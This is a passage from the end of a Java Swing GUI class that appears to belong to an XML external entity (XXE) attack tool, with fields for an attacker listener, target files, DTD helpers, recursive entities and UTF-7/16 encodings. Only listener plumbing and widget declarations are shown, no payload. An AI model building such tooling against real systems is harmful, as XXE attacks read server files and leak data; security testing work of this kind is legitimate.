                    currentDtdHelper = currentDtdHelper.replace(targetFILE, targetFileTextField.getText());
                }                
            }
            setDTD();
        }
        
        @Override
        public void insertUpdate(DocumentEvent de) {
            update(de);
        }
        
        @Override
        public void removeUpdate(DocumentEvent de) {
            update(de);
        }

        @Override
        public void changedUpdate(DocumentEvent de) {
            update(de);
        }        
    }
    
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton adjustDTDButton;
    private javax.swing.JTextField attackeListenerTextField;
    private javax.swing.JCheckBox autoModifyCheckbox;
    private javax.swing.JComboBox<String> dtdComboBox;
    private javax.swing.JCheckBox enableEditoringCheckbox;
    private javax.swing.ButtonGroup encodingButtonGroup;
    private javax.swing.JTextField entityReferencesTextField;
    private javax.swing.JTextField helperURLTextField;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JLabel jLabel7;
    private javax.swing.JLabel jLabel8;
    private javax.swing.JLabel jLabel9;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JScrollPane jScrollPane3;
    private javax.swing.JButton modifyButton;
    private javax.swing.JRadioButton publicRadioButton;
    private javax.swing.JTextField recursiveEntitieTextField;
    private javax.swing.ButtonGroup sysPubButtonGroup;
    private javax.swing.JRadioButton systemRadioButton;
    private javax.swing.JList<String> targetFileList;
    private javax.swing.JTextField targetFileTextField;
    private javax.swing.JRadioButton utf16RadioButton;
    private javax.swing.JRadioButton utf7RadioButton;
    private javax.swing.JRadioButton utf8RadioButton;
    // End of variables declaration//GEN-END:variables
}